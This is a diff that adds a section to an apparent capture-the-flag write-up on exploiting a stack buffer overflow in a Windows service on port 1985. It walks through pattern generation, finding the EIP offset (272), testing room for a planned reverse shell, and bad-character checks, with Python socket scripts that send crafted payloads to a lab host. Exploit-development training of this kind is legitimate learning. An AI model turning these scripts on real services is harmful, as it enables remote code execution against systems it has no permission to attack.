@@ -307,3 +307,197 @@ With Immunity Debugger run as Administrator on the Windows vm, we run the python
 and end it with a nullbyte as instructed by the message we found earlier. We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (ascii 41).  Buffer Overflow vulnerability likely exists.
 
 ![test1](https://user-images.githubusercontent.com/76034874/181864956-0bf73890-b264-4522-89e8-fc1b6e5db3cf.png)
+
+
+## Finding the Offset
+our 2nd poc script will contain a unique repeating pattern of characters so we can identify what memory address the program is crashing.
+
+``` bash
+┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
+└─# msf-pattern_create -l 500                                                                          
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+```
+
+
+```python
+
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+As = b'A'
+unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
+nullbyte = b'\x00'
+payload = As * 500 + unique + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+    
+```    
+
+Immunity Debugger shows us the EIP is overwritten with 316A4130 (our unique characters) that represent in ascii. We can find the offset with the pattern_offset tool built into mfsvenom:
+
+![offet](https://user-images.githubusercontent.com/76034874/181865840-625f8d1e-71e0-4987-bdd6-19bd7ca81eea.png)
+
+
+```bash
+
+┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
+└─# msf-pattern_offset -q 316a4130
+[*] Exact match at offset 272
+```
+
+
+
+Testing the offset calculation fro above and confirming we still control the EIP:
+We send  A's equal to the offset, add four B's and end it with a nullbyte for test3
+
+```python
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+As = b'A'
+Bs = b'B' * 4
+offset = 272
+nullbyte = b'\x00'
+payload = As * offset + Bs + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+```
+
+
+We can see the offset is correct because we have overwritten the EIP with B's (42424242)
+
+![bbbb](https://user-images.githubusercontent.com/76034874/181866355-54749141-e981-4f9a-ad50-ba9b632c9e7b.png)
+
+
+## Testing "is there room for evil?  Our rev shell payload will be around 400 bytes.  Can we write this much to the buffer?
+We will send an additional byte-string of 400 Cs, representing our payload to make sure:
+
+
+```python
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+As = b'A'
+Bs = b'B' * 4
+Cs = b'C' * 400
+offset = 272
+nullbyte = b'\x00'
+payload = As * offset + Bs + Cs + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+```    
+
+![cccc](https://user-images.githubusercontent.com/76034874/181866624-1e9edd0c-f52f-4303-92d4-49896367ae6f.png)
+
+## Testing for Bad Characters. 
+### The most common bad characters are x00,x0A,x0D, and xff due to the way the C language interprets these as 'special characters' instead of what we might intend.  We want to make sure msfvenom avoids using any we find while generating our payload, so it will run successfully.
+
+We have a list presaved and formated for python3 but they can also be found here: https://github.com/cytopia/badchars
+or simply outputed to screen with this quick script:
+```python
+#!/usr/bin/python
+import sys
+for x in range(1,256):
+    print('\\x{:02x}'.format(x), end = '')
+```    
+
+so this step will be to send our As plus offset + Bs + badchars + nullbyte:
+
+```python
+
+
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+badchars =b''
+badchars+=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+badchars+=b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+badchars+=b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+badchars+=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+badchars+=b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+badchars+=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+badchars+=b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+badchars+=b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+badchars+=b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+badchars+=b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+badchars+=b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+badchars+=b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+badchars+=b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+badchars+=b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+badchars+=b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+
+As = b'A'
+Bs = b'B' * 4
+
+offset = 272
+nullbyte = b'\x00'
+payload = As * offset + Bs + badchars + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+```
+We are checking that every hex value from x00-FF is in order without any errors.  Here it is perfect:
+
+
+![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)
+
